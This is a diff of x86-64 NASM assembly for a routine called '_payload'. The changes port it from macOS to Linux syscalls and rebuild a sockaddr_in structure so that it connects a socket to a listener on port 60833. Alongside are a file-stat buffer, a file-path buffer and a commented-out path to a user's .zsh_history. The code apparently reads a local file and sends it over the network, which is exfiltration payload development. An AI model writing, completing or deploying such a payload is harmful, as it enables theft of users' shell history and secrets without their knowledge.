@@ -26,11 +26,19 @@ global _payload_size
 
 section .text
 
+;; Data definitions
+struc sockaddr_in
+    .sin_family resw 1
+    .sin_port resw 1
+    .sin_addr resd 1
+    .sin_zero resb 8
+endstruc
+
 _payload:
 	pushx rax, rdi, rsi, rdx, r10
 
 	; sys_write
-	mov rax, 0x2000004          ; syscall number for sys_write
+	mov rax, 1          ; syscall number for sys_write
 	mov rdi, 1          ; file descriptor (stdout)
 	lea rsi, [rel .msg]  ; pointer to message
 	mov rdx, 7          ; length of message
@@ -69,17 +77,18 @@ _payload:
 	mov r13, rax
 
 	; Prepare sockaddr_in structure
-	mov word [rel CONNECT_BUFFER + 1], 2          ; sin_family (AF_INET)
-	movzx rax, word [rel SERVER_PORT]
-	mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
-	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
-	mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
+	; mov word [rel CONNECT_BUFFER + 1], 2          ; sin_family (AF_INET)
+	; movzx rax, word [rel SERVER_PORT]
+	; mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
+	; mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
+	; mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
+	; mov [pop_sa + sockaddr_in.sin_port], bx
 	
 	; Connect the socket
-	mov rax, 42						; syscall number for connect
-	mov rdi, r13					; socket file descriptor
-	lea rsi, [rel CONNECT_BUFFER]	; pointer to sockaddr_in
-	mov rdx, 16						; size of sockaddr_in
+	mov rax, 42					; syscall number for connect
+	mov rdi, r13				; socket file descriptor
+	lea rsi, [rel pop_sa]		; pointer to sockaddr_in
+	mov rdx, 16					; size of sockaddr_in
 	syscall
 	cmp rax, -1
 	je .clean
@@ -110,7 +119,14 @@ _payload:
 	; ret
 
 STATBUFFER		times 144 db 0
-CONNECT_BUFFER	times 16 db 0
+; CONNECT_BUFFER	times 16 db 0
+;; sockaddr_in structure for the address the listening socket binds to
+pop_sa istruc sockaddr_in
+	at sockaddr_in.sin_family,	dw 2			; AF_INET
+	at sockaddr_in.sin_port,	dw 0xa1ed		; port 60833
+	at sockaddr_in.sin_addr,	dd 0			; localhost
+	at sockaddr_in.sin_zero,	dd 0, 0
+iend
 FILEPATH		times 1024 db 0
 ; FILEPATH		db '/home/maxence/.zsh_history', 0
 SERVER_PORT		dd 0xba0b
